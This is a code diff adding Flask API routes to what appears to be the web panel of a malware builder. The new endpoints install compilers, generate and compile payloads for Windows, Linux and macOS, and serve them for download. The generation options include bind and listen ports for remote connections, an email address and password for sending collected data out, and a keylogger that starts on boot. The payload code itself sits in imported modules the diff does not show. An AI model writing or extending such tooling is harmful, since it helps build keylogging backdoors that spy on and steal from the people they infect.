@@ -49,6 +49,16 @@ from auth_utils import (
     clear_failed_login_attempts
 )
 
+# Import advanced payload generation modules
+from build_tools_manager import build_tools_manager, get_build_tools_status, install_missing_build_tools
+from advanced_payload_generator import advanced_payload_generator, generate_advanced_payload
+from payload_file_manager import (
+    payload_file_manager, payload_download_manager,
+    register_payload_file, create_payload_download_session,
+    validate_payload_download, get_payload_file_path,
+    mark_payload_downloaded, get_payload_storage_stats
+)
+
 # ============================================================================
 # Configuration - Now loaded from Config module
 # ============================================================================
@@ -933,6 +943,244 @@ def download_payload():
             
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+
+# ============================================================================
+# Advanced Payload Generation API Routes
+# ============================================================================
+
+@app.route('/api/build-tools-status')
+@login_required
+def get_build_tools_status_api():
+    """Get status of payload build tools"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        tools_status = get_build_tools_status()
+        
+        # Add compilation capabilities
+        capabilities = build_tools_manager.get_compilation_capabilities()
+        
+        # Add recommendations
+        recommendations = {
+            'windows': build_tools_manager.get_recommended_tools_for_target('windows'),
+            'linux': build_tools_manager.get_recommended_tools_for_target('linux'),
+            'macos': build_tools_manager.get_recommended_tools_for_target('macos')
+        }
+        
+        return jsonify({
+            'success': True,
+            'tools': tools_status,
+            'capabilities': capabilities,
+            'recommendations': recommendations,
+            'platform': {
+                'system': platform.system(),
+                'architecture': platform.architecture()[0],
+                'python_version': platform.python_version()
+            }
+        })
+    except Exception as e:
+        log_debug(f"Error getting build tools status: {str(e)}", "ERROR", "BuildTools")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/install-build-tools', methods=['POST'])
+@login_required
+@limiter.limit("2 per hour")  # Prevent abuse of installation
+def install_build_tools_api():
+    """Auto-install missing build tools"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        data = request.json or {}
+        required_tools = data.get('tools', ['pyinstaller'])
+        
+        log_debug(f"Installing build tools: {required_tools}", "INFO", "BuildTools")
+        
+        # Install tools
+        install_results = install_missing_build_tools(required_tools)
+        
+        # Check results
+        success_count = sum(1 for success, _ in install_results.values() if success)
+        total_count = len(install_results)
+        
+        return jsonify({
+            'success': success_count == total_count,
+            'results': {tool: {'success': success, 'message': message} 
+                       for tool, (success, message) in install_results.items()},
+            'summary': {
+                'total_tools': total_count,
+                'successful': success_count,
+                'failed': total_count - success_count
+            }
+        })
+        
+    except Exception as e:
+        log_debug(f"Error installing build tools: {str(e)}", "ERROR", "BuildTools")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/generate-payload-advanced', methods=['POST'])
+@login_required
+@limiter.limit("3 per hour")  # Lower limit due to compilation overhead
+def generate_payload_advanced():
+    """Generate advanced payloads with compilation support"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        data = request.json or {}
+        
+        log_debug("Starting advanced payload generation", "INFO", "AdvancedPayload")
+        
+        # Extract configuration
+        config = {
+            'bind_host': data.get('bind_host', ''),
+            'bind_port': int(data.get('bind_port', 4433)),
+            'listen_host': data.get('listen_host', 'localhost'),
+            'listen_port': int(data.get('listen_port', 4455)),
+            'enable_bind': data.get('enable_bind', True),
+            'enable_listen': data.get('enable_listen', True),
+            'email': data.get('email', 'None'),
+            'email_pwd': data.get('email_pwd', ''),
+            'keylogger_boot': data.get('keylogger_boot', False),
+            'compile_payload': data.get('compile_payload', True),
+            'target_os': data.get('target_os', 'auto'),
+            'payload_type': data.get('payload_type', 'auto'),
+            'create_installers': data.get('create_installers', False),
+            'output_format': data.get('output_format', 'single')
+        }
+        
+        # Validate configuration
+        if not (1 <= config['bind_port'] <= 65535):
+            return jsonify({'success': False, 'error': 'Invalid bind port'}), 400
+        
+        if not (1 <= config['listen_port'] <= 65535):
+            return jsonify({'success': False, 'error': 'Invalid listen port'}), 400
+        
+        # Generate payload
+        result = generate_advanced_payload(**config)
+        
+        if not result['success']:
+            log_debug(f"Advanced payload generation failed: {result.get('error', 'Unknown error')}", "ERROR", "AdvancedPayload")
+            return jsonify(result), 500
+        
+        # Register file for download if successful
+        if 'file_path' in result:
+            file_metadata = {
+                'generation_config': config,
+                'generation_time': datetime.now().isoformat(),
+                'user': session.get('username', 'unknown'),
+                'type': result.get('type', 'unknown')
+            }
+            
+            file_id = register_payload_file(result['file_path'], file_metadata)
+            session_id = create_payload_download_session(file_id, {
+                'user': session.get('username'),
+                'ip': get_remote_address()
+            })
+            
+            # Update result with download information
+            result.update({
+                'file_id': file_id,
+                'download_url': f'/api/download-advanced-payload/{session_id}',
+                'expires_in_minutes': 30
+            })
+            
+            # Remove file_path from result for security
+            del result['file_path']
+        
+        log_debug(f"Advanced payload generated successfully: {result.get('filename', 'unknown')}", "INFO", "AdvancedPayload")
+        return jsonify(result)
+        
+    except Exception as e:
+        log_debug(f"Advanced payload generation error: {str(e)}", "ERROR", "AdvancedPayload")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/download-advanced-payload/<session_id>')
+@login_required
+def download_advanced_payload(session_id):
+    """Download advanced payload using secure session"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        
+        # Validate session
+        valid, file_id = validate_payload_download(session_id)
+        if not valid:
+            log_debug(f"Invalid download session: {session_id}", "WARNING", "AdvancedPayload")
+            return jsonify({'error': 'Invalid or expired download session'}), 404
+        
+        # Get file path
+        file_path = get_payload_file_path(file_id)
+        if not file_path or not os.path.exists(file_path):
+            log_debug(f"File not found for session: {session_id}", "ERROR", "AdvancedPayload")
+            return jsonify({'error': 'File not found'}), 404
+        
+        # Get file info
+        file_info = payload_file_manager.get_file_info(file_id)
+        filename = file_info['filename'] if file_info else os.path.basename(file_path)
+        
+        # Mark as downloaded
+        mark_payload_downloaded(session_id)
+        
+        log_debug(f"Advanced payload downloaded: {filename}", "INFO", "AdvancedPayload")
+        
+        # Determine MIME type based on file extension
+        if filename.endswith('.exe'):
+            mimetype = 'application/octet-stream'
+        elif filename.endswith('.zip'):
+            mimetype = 'application/zip'
+        elif filename.endswith('.py'):
+            mimetype = 'text/x-python'
+        else:
+            mimetype = 'application/octet-stream'
+        
+        return send_file(file_path, 
+                        as_attachment=True, 
+                        download_name=filename,
+                        mimetype=mimetype)
+        
+    except Exception as e:
+        log_debug(f"Error downloading advanced payload: {str(e)}", "ERROR", "AdvancedPayload")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/payload-storage-stats')
+@login_required
+def get_payload_storage_stats_api():
+    """Get payload storage statistics"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        
+        storage_stats = get_payload_storage_stats()
+        session_stats = payload_download_manager.get_session_stats()
+        
+        return jsonify({
+            'success': True,
+            'storage': storage_stats,
+            'sessions': session_stats
+        })
+        
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/cleanup-payload-storage', methods=['POST'])
+@login_required
+@limiter.limit("5 per hour")
+def cleanup_payload_storage():
+    """Manually trigger payload storage cleanup"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        
+        # Cleanup expired files
+        cleaned_files = payload_file_manager.cleanup_expired_files()
+        
+        # Cleanup expired sessions
+        cleaned_sessions = payload_download_manager.cleanup_expired_sessions()
+        
+        log_debug(f"Manual cleanup: {cleaned_files} files, {cleaned_sessions} sessions", "INFO", "Cleanup")
+        
+        return jsonify({
+            'success': True,
+            'cleaned_files': cleaned_files,
+            'cleaned_sessions': cleaned_sessions
+        })
+        
+    except Exception as e:
+        log_debug(f"Error during manual cleanup: {str(e)}", "ERROR", "Cleanup")
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/upload', methods=['POST'])
 @login_required
